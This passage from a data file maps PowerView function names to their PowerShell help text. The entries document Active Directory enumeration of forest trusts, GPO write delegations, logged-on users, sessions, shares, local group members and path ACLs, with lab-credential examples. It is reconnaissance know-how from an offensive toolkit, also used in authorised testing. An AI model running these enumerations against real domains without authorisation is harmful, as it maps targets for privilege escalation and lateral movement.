                          'Get-ForestSchemaClass -ClassName user -Forest '
                          'external.local -Credential $Cred\n'
                          '\n'
                          'Returns the user schema class for the '
                          'external.local domain using\n'
                          'the specified alternate credentials.\n'
                          '\n'
                          '.OUTPUTS\n'
                          '\n'
                          '[DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass]\n'
                          '\n'
                          'An ActiveDirectorySchemaClass returned from the '
                          'found schema.\n',
 'Get-ForestTrust': '.SYNOPSIS\n'
                    '\n'
                    'Return all forest trusts for the current forest or a '
                    'specified forest.\n'
                    '\n'
                    'Author: Will Schroeder (@harmj0y)  \n'
                    'License: BSD 3-Clause  \n'
                    'Required Dependencies: Get-Forest  \n'
                    '\n'
                    '.DESCRIPTION\n'
                    '\n'
                    'This function will enumerate domain trust relationships '
                    'for the current (or a remote)\n'
                    'forest using number of method using the .NET method '
                    'GetAllTrustRelationships() on a\n'
                    'System.DirectoryServices.ActiveDirectory.Forest returned '
                    'by Get-Forest.\n'
                    '\n'
                    '.PARAMETER Forest\n'
                    '\n'
                    'Specifies the forest to query for trusts, defaults to the '
                    'current forest.\n'
                    '\n'
                    '.PARAMETER Credential\n'
                    '\n'
                    'A [Management.Automation.PSCredential] object of '
                    'alternate credentials\n'
                    'for connection to the target domain.\n'
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    'Get-ForestTrust\n'
                    '\n'
                    'Return current forest trusts.\n'
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    'Get-ForestTrust -Forest "external.local"\n'
                    '\n'
                    'Return trusts for the "external.local" forest.\n'
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    "$SecPassword = ConvertTo-SecureString 'Password123!' "
                    '-AsPlainText -Force\n'
                    '$Cred = New-Object '
                    "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                    '$SecPassword)\n'
                    'Get-ForestTrust -Forest "external.local" -Credential '
                    '$Cred\n'
                    '\n'
                    'Return trusts for the "external.local" forest using the '
                    'specified alternate credenitals.\n'
                    '\n'
                    '.OUTPUTS\n'
                    '\n'
                    'PowerView.DomainTrust.NET\n'
                    '\n'
                    'A TrustRelationshipInformationCollection returned when '
                    'using .NET methods (default).\n',
 'Get-GPODelegation': '.SYNOPSIS\n'
                      '\n'
                      'Finds users with write permissions on GPO objects which '
                      'may allow privilege escalation within the domain.\n'
                      '\n'
                      'Author: Itamar Mizrahi (@MrAnde7son)  \n'
                      'License: BSD 3-Clause  \n'
                      'Required Dependencies: None  \n'
                      '\n'
                      '.PARAMETER GPOName\n'
                      '\n'
                      'The GPO display name to query for, wildcards accepted.\n'
                      '\n'
                      '.PARAMETER PageSize\n'
                      '\n'
                      'Specifies the PageSize to set for the LDAP searcher '
                      'object.\n'
                      '\n'
                      '.EXAMPLE\n'
                      '\n'
                      'Get-GPODelegation\n'
                      '\n'
                      'Returns all GPO delegations in current forest.\n'
                      '\n'
                      '.EXAMPLE\n'
                      '\n'
                      'Get-GPODelegation -GPOName\n'
                      '\n'
                      'Returns all GPO delegations on a given GPO.\n',
 'Get-GptTmpl': '.SYNOPSIS\n'
                '\n'
                'Helper to parse a GptTmpl.inf policy file path into a '
                'hashtable.\n'
                '\n'
                'Author: Will Schroeder (@harmj0y)  \n'
                'License: BSD 3-Clause  \n'
                'Required Dependencies: Add-RemoteConnection, '
                'Remove-RemoteConnection, Get-IniContent  \n'
                '\n'
                '.DESCRIPTION\n'
                '\n'
                'Parses a GptTmpl.inf into a custom hashtable using '
                'Get-IniContent. If a\n'
                'GPO object is passed, GPOPATH\\MACHINE\\Microsoft\\Windows '
                'NT\\SecEdit\\GptTmpl.inf\n'
                'is constructed and assumed to be the parse target. If '
                '-Credential is passed,\n'
                'Add-RemoteConnection is used to mount \\\\TARGET\\SYSVOL with '
                'the specified creds,\n'
                'the files are parsed, and the connection is destroyed later '
                'with Remove-RemoteConnection.\n'
                '\n'
                '.PARAMETER GptTmplPath\n'
                '\n'
                'Specifies the GptTmpl.inf file path name to parse.\n'
                '\n'
                '.PARAMETER OutputObject\n'
                '\n'
                'Switch. Output a custom PSObject instead of a hashtable.\n'
                '\n'
                '.PARAMETER Credential\n'
                '\n'
                'A [Management.Automation.PSCredential] object of alternate '
                'credentials\n'
                'for connection to the remote system.\n'
                '\n'
                '.EXAMPLE\n'
                '\n'
                'Get-GptTmpl -GptTmplPath '
                '"\\\\dev.testlab.local\\sysvol\\dev.testlab.local\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Microsoft\\Windows '
                'NT\\SecEdit\\GptTmpl.inf"\n'
                '\n'
                'Parse the default domain policy .inf for dev.testlab.local\n'
                '\n'
                '.EXAMPLE\n'
                '\n'
                'Get-DomainGPO testing | Get-GptTmpl\n'
                '\n'
                'Parse the GptTmpl.inf policy for the GPO with display name of '
                "'testing'.\n"
                '\n'
                '.EXAMPLE\n'
                '\n'
                "$SecPassword = ConvertTo-SecureString 'Password123!' "
                '-AsPlainText -Force\n'
                '$Cred = New-Object '
                "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                '$SecPassword)\n'
                'Get-GptTmpl -Credential $Cred -GptTmplPath '
                '"\\\\dev.testlab.local\\sysvol\\dev.testlab.local\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Microsoft\\Windows '
                'NT\\SecEdit\\GptTmpl.inf"\n'
                '\n'
                'Parse the default domain policy .inf for dev.testlab.local '
                'using alternate credentials.\n'
                '\n'
                '.OUTPUTS\n'
                '\n'
                'Hashtable\n'
                '\n'
                'Ouputs a hashtable representing the parsed GptTmpl.inf '
                'file.\n',
 'Get-GroupsXML': '.SYNOPSIS\n'
                  '\n'
                  'Helper to parse a groups.xml file path into a custom '
                  'object.\n'
                  '\n'
                  'Author: Will Schroeder (@harmj0y)  \n'
                  'License: BSD 3-Clause  \n'
                  'Required Dependencies: Add-RemoteConnection, '
                  'Remove-RemoteConnection, ConvertTo-SID  \n'
                  '\n'
                  '.DESCRIPTION\n'
                  '\n'
                  'Parses a groups.xml into a custom object. If -Credential is '
                  'passed,\n'
                  'Add-RemoteConnection is used to mount \\\\TARGET\\SYSVOL '
                  'with the specified creds,\n'
                  'the files are parsed, and the connection is destroyed later '
                  'with Remove-RemoteConnection.\n'
                  '\n'
                  '.PARAMETER GroupsXMLpath\n'
                  '\n'
                  'Specifies the groups.xml file path name to parse.\n'
                  '\n'
                  '.PARAMETER Credential\n'
                  '\n'
                  'A [Management.Automation.PSCredential] object of alternate '
                  'credentials\n'
                  'for connection to the remote system.\n'
                  '\n'
                  '.OUTPUTS\n'
                  '\n'
                  'PowerView.GroupsXML\n',
 'Get-IniContent': '.SYNOPSIS\n'
                   '\n'
                   'This helper parses an .ini file into a hashtable.\n'
                   '\n'
                   "Author: 'The Scripting Guys'\n"
                   'Modifications: @harmj0y (-Credential support)\n'
                   'License: BSD 3-Clause\n'
                   'Required Dependencies: Add-RemoteConnection, '
                   'Remove-RemoteConnection\n'
                   '\n'
                   '.DESCRIPTION\n'
                   '\n'
                   'Parses an .ini file into a hashtable. If -Credential is '
                   'supplied,\n'
                   'then Add-RemoteConnection is used to map '
                   '\\\\COMPUTERNAME\\IPC$, the file\n'
                   'is parsed, and then the connection is destroyed with '
                   'Remove-RemoteConnection.\n'
                   '\n'
                   '.PARAMETER Path\n'
                   '\n'
                   'Specifies the path to the .ini file to parse.\n'
                   '\n'
                   '.PARAMETER OutputObject\n'
                   '\n'
                   'Switch. Output a custom PSObject instead of a hashtable.\n'
                   '\n'
                   '.PARAMETER Credential\n'
                   '\n'
                   'A [Management.Automation.PSCredential] object of alternate '
                   'credentials\n'
                   'for connection to the remote system.\n'
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   'Get-IniContent C:\\Windows\\example.ini\n'
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   '"C:\\Windows\\example.ini" | Get-IniContent -OutputObject\n'
                   '\n'
                   'Outputs the .ini details as a proper nested PSObject.\n'
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   '"C:\\Windows\\example.ini" | Get-IniContent\n'
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   "$SecPassword = ConvertTo-SecureString 'Password123!' "
                   '-AsPlainText -Force\n'
                   '$Cred = New-Object '
                   "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                   '$SecPassword)\n'
                   'Get-IniContent -Path '
                   '\\\\PRIMARY.testlab.local\\C$\\Temp\\GptTmpl.inf '
                   '-Credential $Cred\n'
                   '\n'
                   '.INPUTS\n'
                   '\n'
                   'String\n'
                   '\n'
                   'Accepts one or more .ini paths on the pipeline.\n'
                   '\n'
                   '.OUTPUTS\n'
                   '\n'
                   'Hashtable\n'
                   '\n'
                   'Ouputs a hashtable representing the parsed .ini file.\n'
                   '\n'
                   '.LINK\n'
                   '\n'
                   'https://blogs.technet.microsoft.com/heyscriptingguy/2011/08/20/use-powershell-to-work-with-any-ini-file/\n',
 'Get-NetComputerSiteName': '.SYNOPSIS\n'
                            '\n'
                            'Returns the AD site where the local (or a remote) '
                            'machine resides.\n'
                            '\n'
                            'Author: Will Schroeder (@harmj0y)  \n'
                            'License: BSD 3-Clause  \n'
                            'Required Dependencies: PSReflect, '
                            'Invoke-UserImpersonation, Invoke-RevertToSelf  \n'
                            '\n'
                            '.DESCRIPTION\n'
                            '\n'
                            'This function will use the DsGetSiteName Win32API '
                            'call to look up the\n'
                            'name of the site where a specified computer '
                            'resides.\n'
                            '\n'
                            '.PARAMETER ComputerName\n'
                            '\n'
                            'Specifies the hostname to check the site for '
                            '(also accepts IP addresses).\n'
                            "Defaults to 'localhost'.\n"
                            '\n'
                            '.PARAMETER Credential\n'
                            '\n'
                            'A [Management.Automation.PSCredential] object of '
                            'alternate credentials\n'
                            'for connection to the remote system using '
                            'Invoke-UserImpersonation.\n'
                            '\n'
                            '.EXAMPLE\n'
                            '\n'
                            'Get-NetComputerSiteName -ComputerName '
                            'WINDOWS1.testlab.local\n'
                            '\n'
                            'Returns the site for WINDOWS1.testlab.local.\n'
                            '\n'
                            '.EXAMPLE\n'
                            '\n'
                            'Get-DomainComputer | Get-NetComputerSiteName\n'
                            '\n'
                            'Returns the sites for every machine in AD.\n'
                            '\n'
                            '.EXAMPLE\n'
                            '\n'
                            '$SecPassword = ConvertTo-SecureString '
                            "'Password123!' -AsPlainText -Force\n"
                            '$Cred = New-Object '
                            "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                            '$SecPassword)\n'
                            'Get-NetComputerSiteName -ComputerName '
                            'WINDOWS1.testlab.local -Credential $Cred\n'
                            '\n'
                            '.OUTPUTS\n'
                            '\n'
                            'PowerView.ComputerSite\n'
                            '\n'
                            'A PSCustomObject containing the ComputerName, '
                            'IPAddress, and associated Site name.\n',
 'Get-NetLocalGroup': '.SYNOPSIS\n'
                      '\n'
                      'Enumerates the local groups on the local (or remote) '
                      'machine.\n'
                      '\n'
                      'Author: Will Schroeder (@harmj0y)  \n'
                      'License: BSD 3-Clause  \n'
                      'Required Dependencies: PSReflect  \n'
                      '\n'
                      '.DESCRIPTION\n'
                      '\n'
                      'This function will enumerate the names and descriptions '
                      'for the\n'
                      'local groups on the current, or remote, machine. By '
                      'default, the Win32 API\n'
                      'call NetLocalGroupEnum will be used (for speed). '
                      'Specifying "-Method WinNT"\n'
                      'causes the WinNT service provider to be used instead, '
                      'which returns group\n'
                      'SIDs along with the group names and '
                      'descriptions/comments.\n'
                      '\n'
                      '.PARAMETER ComputerName\n'
                      '\n'
                      'Specifies the hostname to query for sessions (also '
                      'accepts IP addresses).\n'
                      'Defaults to the localhost.\n'
                      '\n'
                      '.PARAMETER Method\n'
                      '\n'
                      "The collection method to use, defaults to 'API', also "
                      "accepts 'WinNT'.\n"
                      '\n'
                      '.PARAMETER Credential\n'
                      '\n'
                      'A [Management.Automation.PSCredential] object of '
                      'alternate credentials\n'
                      'for connection to a remote machine. Only applicable '
                      'with "-Method WinNT".\n'
                      '\n'
                      '.EXAMPLE\n'
                      '\n'
                      'Get-NetLocalGroup\n'
                      '\n'
                      'ComputerName                  '
                      'GroupName                     Comment\n'
                      '------------                  '
                      '---------                     -------\n'
                      'WINDOWS1                      '
                      'Administrators                Administrators have '
                      'comple...\n'
                      'WINDOWS1                      Backup '
                      'Operators              Backup Operators can overr...\n'
                      'WINDOWS1                      Cryptographic '
                      'Operators       Members are authorized to ...\n'
                      '...\n'
                      '\n'
                      '.EXAMPLE\n'
                      '\n'
                      'Get-NetLocalGroup -Method Winnt\n'
                      '\n'
                      'ComputerName           GroupName              '
                      'GroupSID              Comment\n'
                      '------------           ---------              '
                      '--------              -------\n'
                      'WINDOWS1               Administrators         '
                      'S-1-5-32-544          Administrators hav...\n'
                      'WINDOWS1               Backup Operators       '
                      'S-1-5-32-551          Backup Operators c...\n'
                      'WINDOWS1               Cryptographic Opera... '
                      'S-1-5-32-569          Members are author...\n'
                      '...\n'
                      '\n'
                      '.EXAMPLE\n'
                      '\n'
                      'Get-NetLocalGroup -ComputerName primary.testlab.local\n'
                      '\n'
                      'ComputerName                  '
                      'GroupName                     Comment\n'
                      '------------                  '
                      '---------                     -------\n'
                      'primary.testlab.local         '
                      'Administrators                Administrators have '
                      'comple...\n'
                      'primary.testlab.local         '
                      'Users                         Users are prevented from '
                      'm...\n'
                      'primary.testlab.local         '
                      'Guests                        Guests have the same '
                      'acces...\n'
                      'primary.testlab.local         Print '
                      'Operators               Members can administer dom...\n'
                      'primary.testlab.local         Backup '
                      'Operators              Backup Operators can overr...\n'
                      '\n'
                      '.OUTPUTS\n'
                      '\n'
                      'PowerView.LocalGroup.API\n'
                      '\n'
                      'Custom PSObject with translated group property fields '
                      'from API results.\n'
                      '\n'
                      'PowerView.LocalGroup.WinNT\n'
                      '\n'
                      'Custom PSObject with translated group property fields '
                      'from WinNT results.\n'
                      '\n'
                      '.LINK\n'
                      '\n'
                      'https://msdn.microsoft.com/en-us/library/windows/desktop/aa370440(v=vs.85).aspx\n',
 'Get-NetLocalGroupMember': '.SYNOPSIS\n'
                            '\n'
                            'Enumerates members of a specific local group on '
                            'the local (or remote) machine.\n'
                            '\n'
                            'Author: Will Schroeder (@harmj0y)  \n'
                            'License: BSD 3-Clause  \n'
                            'Required Dependencies: PSReflect, '
                            'Convert-ADName  \n'
                            '\n'
                            '.DESCRIPTION\n'
                            '\n'
                            'This function will enumerate the members of a '
                            'specified local group  on the\n'
                            'current, or remote, machine. By default, the '
                            'Win32 API call NetLocalGroupGetMembers\n'
                            'will be used (for speed). Specifying "-Method '
                            'WinNT" causes the WinNT service provider\n'
                            'to be used instead, which returns a larger amount '
                            'of information.\n'
                            '\n'
                            '.PARAMETER ComputerName\n'
                            '\n'
                            'Specifies the hostname to query for sessions '
                            '(also accepts IP addresses).\n'
                            'Defaults to the localhost.\n'
                            '\n'
                            '.PARAMETER GroupName\n'
                            '\n'
                            'The local group name to query for users. If not '
                            'given, it defaults to "Administrators".\n'
                            '\n'
                            '.PARAMETER Method\n'
                            '\n'
                            "The collection method to use, defaults to 'API', "
                            "also accepts 'WinNT'.\n"
                            '\n'
                            '.PARAMETER Credential\n'
                            '\n'
                            'A [Management.Automation.PSCredential] object of '
                            'alternate credentials\n'
                            'for connection to a remote machine. Only '
                            'applicable with "-Method WinNT".\n'
                            '\n'
                            '.EXAMPLE\n'
                            '\n'
                            'Get-NetLocalGroupMember | ft\n'
                            '\n'
                            'ComputerName   GroupName      MemberName     '
                            'SID                   IsGroup       IsDomain\n'
                            '------------   ---------      ----------     '
                            '---                   -------       --------\n'
                            'WINDOWS1       Administrators WINDOWS1\\Ad... '
                            'S-1-5-21-25...          False          False\n'
                            'WINDOWS1       Administrators WINDOWS1\\lo... '
                            'S-1-5-21-25...          False          False\n'
                            'WINDOWS1       Administrators TESTLAB\\Dom... '
                            'S-1-5-21-89...           True           True\n'
                            'WINDOWS1       Administrators TESTLAB\\har... '
                            'S-1-5-21-89...          False           True\n'
                            '\n'
                            '.EXAMPLE\n'
                            '\n'
                            'Get-NetLocalGroupMember -Method winnt | ft\n'
                            '\n'
                            'ComputerName   GroupName      MemberName     '
                            'SID                   IsGroup       IsDomain\n'
                            '------------   ---------      ----------     '
                            '---                   -------       --------\n'
                            'WINDOWS1       Administrators WINDOWS1\\Ad... '
                            'S-1-5-21-25...          False          False\n'
                            'WINDOWS1       Administrators WINDOWS1\\lo... '
                            'S-1-5-21-25...          False          False\n'
                            'WINDOWS1       Administrators TESTLAB\\Dom... '
                            'S-1-5-21-89...           True           True\n'
                            'WINDOWS1       Administrators TESTLAB\\har... '
                            'S-1-5-21-89...          False           True\n'
                            '\n'
                            '.EXAMPLE\n'
                            '\n'
                            'Get-NetLocalGroup | Get-NetLocalGroupMember | ft\n'
                            '\n'
                            'ComputerName   GroupName      MemberName     '
                            'SID                   IsGroup       IsDomain\n'
                            '------------   ---------      ----------     '
                            '---                   -------       --------\n'
                            'WINDOWS1       Administrators WINDOWS1\\Ad... '
                            'S-1-5-21-25...          False          False\n'
                            'WINDOWS1       Administrators WINDOWS1\\lo... '
                            'S-1-5-21-25...          False          False\n'
                            'WINDOWS1       Administrators TESTLAB\\Dom... '
                            'S-1-5-21-89...           True           True\n'
                            'WINDOWS1       Administrators TESTLAB\\har... '
                            'S-1-5-21-89...          False           True\n'
                            'WINDOWS1       Guests         WINDOWS1\\Guest '
                            'S-1-5-21-25...          False          False\n'
                            'WINDOWS1       IIS_IUSRS      NT AUTHORIT... '
                            'S-1-5-17                False          False\n'
                            'WINDOWS1       Users          NT AUTHORIT... '
                            'S-1-5-4                 False          False\n'
                            'WINDOWS1       Users          NT AUTHORIT... '
                            'S-1-5-11                False          False\n'
                            'WINDOWS1       Users          WINDOWS1\\lo... '
                            'S-1-5-21-25...          False        UNKNOWN\n'
                            'WINDOWS1       Users          TESTLAB\\Dom... '
                            'S-1-5-21-89...           True        UNKNOWN\n'
                            '\n'
                            '.EXAMPLE\n'
                            '\n'
                            'Get-NetLocalGroupMember -ComputerName '
                            'primary.testlab.local | ft\n'
                            '\n'
                            'ComputerName   GroupName      MemberName     '
                            'SID                   IsGroup       IsDomain\n'
                            '------------   ---------      ----------     '
                            '---                   -------       --------\n'
                            'primary.tes... Administrators TESTLAB\\Adm... '
                            'S-1-5-21-89...          False          False\n'
                            'primary.tes... Administrators TESTLAB\\loc... '
                            'S-1-5-21-89...          False          False\n'
                            'primary.tes... Administrators TESTLAB\\Ent... '
                            'S-1-5-21-89...           True          False\n'
                            'primary.tes... Administrators TESTLAB\\Dom... '
                            'S-1-5-21-89...           True          False\n'
                            '\n'
                            '.OUTPUTS\n'
                            '\n'
                            'PowerView.LocalGroupMember.API\n'
                            '\n'
                            'Custom PSObject with translated group property '
                            'fields from API results.\n'
                            '\n'
                            'PowerView.LocalGroupMember.WinNT\n'
                            '\n'
                            'Custom PSObject with translated group property '
                            'fields from WinNT results.\n'
                            '\n'
                            '.LINK\n'
                            '\n'
                            'http://stackoverflow.com/questions/21288220/get-all-local-members-and-groups-displayed-together\n'
                            'http://msdn.microsoft.com/en-us/library/aa772211(VS.85).aspx\n'
                            'https://msdn.microsoft.com/en-us/library/windows/desktop/aa370601(v=vs.85).aspx\n',
 'Get-NetLoggedon': '.SYNOPSIS\n'
                    '\n'
                    'Returns users logged on the local (or a remote) machine.\n'
                    'Note: administrative rights needed for newer Windows '
                    'OSes.\n'
                    '\n'
                    'Author: Will Schroeder (@harmj0y)  \n'
                    'License: BSD 3-Clause  \n'
                    'Required Dependencies: PSReflect, '
                    'Invoke-UserImpersonation, Invoke-RevertToSelf  \n'
                    '\n'
                    '.DESCRIPTION\n'
                    '\n'
                    'This function will execute the NetWkstaUserEnum Win32API '
                    'call to query\n'
                    'a given host for actively logged on users.\n'
                    '\n'
                    '.PARAMETER ComputerName\n'
                    '\n'
                    'Specifies the hostname to query for logged on users (also '
                    'accepts IP addresses).\n'
                    "Defaults to 'localhost'.\n"
                    '\n'
                    '.PARAMETER Credential\n'
                    '\n'
                    'A [Management.Automation.PSCredential] object of '
                    'alternate credentials\n'
                    'for connection to the remote system using '
                    'Invoke-UserImpersonation.\n'
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    'Get-NetLoggedon\n'
                    '\n'
                    'Returns users actively logged onto the local host.\n'
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    'Get-NetLoggedon -ComputerName sqlserver\n'
                    '\n'
                    "Returns users actively logged onto the 'sqlserver' host.\n"
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    'Get-DomainComputer | Get-NetLoggedon\n'
                    '\n'
                    'Returns all logged on users for all computers in the '
                    'domain.\n'
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    "$SecPassword = ConvertTo-SecureString 'Password123!' "
                    '-AsPlainText -Force\n'
                    '$Cred = New-Object '
                    "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                    '$SecPassword)\n'
                    'Get-NetLoggedon -ComputerName sqlserver -Credential '
                    '$Cred\n'
                    '\n'
                    '.OUTPUTS\n'
                    '\n'
                    'PowerView.LoggedOnUserInfo\n'
                    '\n'
                    'A PSCustomObject representing a WKSTA_USER_INFO_1 '
                    'structure, including\n'
                    'the UserName/LogonDomain/AuthDomains/LogonServer for each '
                    'user, with the ComputerName added.\n'
                    '\n'
                    '.LINK\n'
                    '\n'
                    'http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/\n',
 'Get-NetRDPSession': '.SYNOPSIS\n'
                      '\n'
                      'Returns remote desktop/session information for the '
                      'local (or a remote) machine.\n'
                      '\n'
                      'Note: only members of the Administrators or Account '
                      'Operators local group\n'
                      'can successfully execute this functionality on a remote '
                      'target.\n'
                      '\n'
                      'Author: Will Schroeder (@harmj0y)  \n'
                      'License: BSD 3-Clause  \n'
                      'Required Dependencies: PSReflect, '
                      'Invoke-UserImpersonation, Invoke-RevertToSelf  \n'
                      '\n'
                      '.DESCRIPTION\n'
                      '\n'
                      'This function will execute the WTSEnumerateSessionsEx '
                      'and WTSQuerySessionInformation\n'
                      'Win32API calls to query a given RDP remote service for '
                      'active sessions and originating\n'
                      'IPs. This is a replacement for qwinsta.\n'
                      '\n'
                      '.PARAMETER ComputerName\n'
                      '\n'
                      'Specifies the hostname to query for active sessions '
                      '(also accepts IP addresses).\n'
                      "Defaults to 'localhost'.\n"
                      '\n'
                      '.PARAMETER Credential\n'
                      '\n'
                      'A [Management.Automation.PSCredential] object of '
                      'alternate credentials\n'
                      'for connection to the remote system using '
                      'Invoke-UserImpersonation.\n'
                      '\n'
                      '.EXAMPLE\n'
                      '\n'
                      'Get-NetRDPSession\n'
                      '\n'
                      'Returns active RDP/terminal sessions on the local '
                      'host.\n'
                      '\n'
                      '.EXAMPLE\n'
                      '\n'
                      'Get-NetRDPSession -ComputerName "sqlserver"\n'
                      '\n'
                      "Returns active RDP/terminal sessions on the 'sqlserver' "
                      'host.\n'
                      '\n'
                      '.EXAMPLE\n'
                      '\n'
                      'Get-DomainController | Get-NetRDPSession\n'
                      '\n'
                      'Returns active RDP/terminal sessions on all domain '
                      'controllers.\n'
                      '\n'
                      '.EXAMPLE\n'
                      '\n'
                      "$SecPassword = ConvertTo-SecureString 'Password123!' "
                      '-AsPlainText -Force\n'
                      '$Cred = New-Object '
                      "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                      '$SecPassword)\n'
                      'Get-NetRDPSession -ComputerName sqlserver -Credential '
                      '$Cred\n'
                      '\n'
                      '.OUTPUTS\n'
                      '\n'
                      'PowerView.RDPSessionInfo\n'
                      '\n'
                      'A PSCustomObject representing a combined '
                      'WTS_SESSION_INFO_1 and WTS_CLIENT_ADDRESS structure,\n'
                      'with the ComputerName added.\n'
                      '\n'
                      '.LINK\n'
                      '\n'
                      'https://msdn.microsoft.com/en-us/library/aa383861(v=vs.85).aspx\n',
 'Get-NetSession': '.SYNOPSIS\n'
                   '\n'
                   'Returns session information for the local (or a remote) '
                   'machine.\n'
                   '\n'
                   'Author: Will Schroeder (@harmj0y)  \n'
                   'License: BSD 3-Clause  \n'
                   'Required Dependencies: PSReflect, '
                   'Invoke-UserImpersonation, Invoke-RevertToSelf  \n'
                   '\n'
                   '.DESCRIPTION\n'
                   '\n'
                   'This function will execute the NetSessionEnum Win32API '
                   'call to query\n'
                   'a given host for active sessions.\n'
                   '\n'
                   '.PARAMETER ComputerName\n'
                   '\n'
                   'Specifies the hostname to query for sessions (also accepts '
                   'IP addresses).\n'
                   "Defaults to 'localhost'.\n"
                   '\n'
                   '.PARAMETER Credential\n'
                   '\n'
                   'A [Management.Automation.PSCredential] object of alternate '
                   'credentials\n'
                   'for connection to the remote system using '
                   'Invoke-UserImpersonation.\n'
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   'Get-NetSession\n'
                   '\n'
                   'Returns active sessions on the local host.\n'
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   'Get-NetSession -ComputerName sqlserver\n'
                   '\n'
                   "Returns active sessions on the 'sqlserver' host.\n"
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   'Get-DomainController | Get-NetSession\n'
                   '\n'
                   'Returns active sessions on all domain controllers.\n'
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   "$SecPassword = ConvertTo-SecureString 'Password123!' "
                   '-AsPlainText -Force\n'
                   '$Cred = New-Object '
                   "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                   '$SecPassword)\n'
                   'Get-NetSession -ComputerName sqlserver -Credential $Cred\n'
                   '\n'
                   '.OUTPUTS\n'
                   '\n'
                   'PowerView.SessionInfo\n'
                   '\n'
                   'A PSCustomObject representing a WKSTA_USER_INFO_1 '
                   'structure, including\n'
                   'the CName/UserName/Time/IdleTime for each session, with '
                   'the ComputerName added.\n'
                   '\n'
                   '.LINK\n'
                   '\n'
                   'http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/\n',
 'Get-NetShare': '.SYNOPSIS\n'
                 '\n'
                 'Returns open shares on the local (or a remote) machine.\n'
                 '\n'
                 'Author: Will Schroeder (@harmj0y)  \n'
                 'License: BSD 3-Clause  \n'
                 'Required Dependencies: PSReflect, Invoke-UserImpersonation, '
                 'Invoke-RevertToSelf  \n'
                 '\n'
                 '.DESCRIPTION\n'
                 '\n'
                 'This function will execute the NetShareEnum Win32API call to '
                 'query\n'
                 'a given host for open shares. This is a replacement for "net '
                 'share \\\\hostname".\n'
                 '\n'
                 '.PARAMETER ComputerName\n'
                 '\n'
                 'Specifies the hostname to query for shares (also accepts IP '
                 'addresses).\n'
                 "Defaults to 'localhost'.\n"
                 '\n'
                 '.PARAMETER Credential\n'
                 '\n'
                 'A [Management.Automation.PSCredential] object of alternate '
                 'credentials\n'
                 'for connection to the remote system using '
                 'Invoke-UserImpersonation.\n'
                 '\n'
                 '.EXAMPLE\n'
                 '\n'
                 'Get-NetShare\n'
                 '\n'
                 'Returns active shares on the local host.\n'
                 '\n'
                 '.EXAMPLE\n'
                 '\n'
                 'Get-NetShare -ComputerName sqlserver\n'
                 '\n'
                 "Returns active shares on the 'sqlserver' host\n"
                 '\n'
                 '.EXAMPLE\n'
                 '\n'
                 'Get-DomainComputer | Get-NetShare\n'
                 '\n'
                 'Returns all shares for all computers in the domain.\n'
                 '\n'
                 '.EXAMPLE\n'
                 '\n'
                 "$SecPassword = ConvertTo-SecureString 'Password123!' "
                 '-AsPlainText -Force\n'
                 '$Cred = New-Object '
                 "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                 '$SecPassword)\n'
                 'Get-NetShare -ComputerName sqlserver -Credential $Cred\n'
                 '\n'
                 '.OUTPUTS\n'
                 '\n'
                 'PowerView.ShareInfo\n'
                 '\n'
                 'A PSCustomObject representing a SHARE_INFO_1 structure, '
                 'including\n'
                 'the name/type/remark for each share, with the ComputerName '
                 'added.\n'
                 '\n'
                 '.LINK\n'
                 '\n'
                 'http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/\n',
 'Get-PathAcl': '.SYNOPSIS\n'
                '\n'
                'Enumerates the ACL for a given file path.\n'
                '\n'
                'Author: Will Schroeder (@harmj0y)  \n'
                'License: BSD 3-Clause  \n'
                'Required Dependencies: Add-RemoteConnection, '
                'Remove-RemoteConnection, ConvertFrom-SID  \n'
                '\n'
                '.DESCRIPTION\n'
                '\n'
                'Enumerates the ACL for a specified file/folder path, and '
                'translates\n'
                'the access rules for each entry into readable formats. If '
                '-Credential is passed,\n'
                'Add-RemoteConnection/Remove-RemoteConnection is used to '
                'temporarily map the remote share.\n'
                '\n'
                '.PARAMETER Path\n'
                '\n'
                'Specifies the local or remote path to enumerate the ACLs '
                'for.\n'
                '\n'
                '.PARAMETER Credential\n'
                '\n'
                'A [Management.Automation.PSCredential] object of alternate '
                'credentials\n'
                'for connection to the target path.\n'
                '\n'
                '.EXAMPLE\n'
                '\n'
                'Get-PathAcl "\\\\SERVER\\Share\\"\n'
                '\n'
                'Returns ACLs for the given UNC share.\n'
                '\n'
                '.EXAMPLE\n'
                '\n'
                'gci .\\test.txt | Get-PathAcl\n'
                '\n'
                '.EXAMPLE\n'
                '\n'
                "$SecPassword = ConvertTo-SecureString 'Password123!' "
                '-AsPlainText -Force\n'
                '$Cred = New-Object '
                "System.Management.Automation.PSCredential('TESTLAB\\dfm', "
                '$SecPassword)\n'
                'Get-PathAcl -Path "\\\\SERVER\\Share\\" -Credential $Cred\n'
                '\n'
                '.INPUTS\n'
                '\n'
                'String\n'
                '\n'
                'One of more paths to enumerate ACLs for.\n'
                '\n'
                '.OUTPUTS\n'
                '\n'
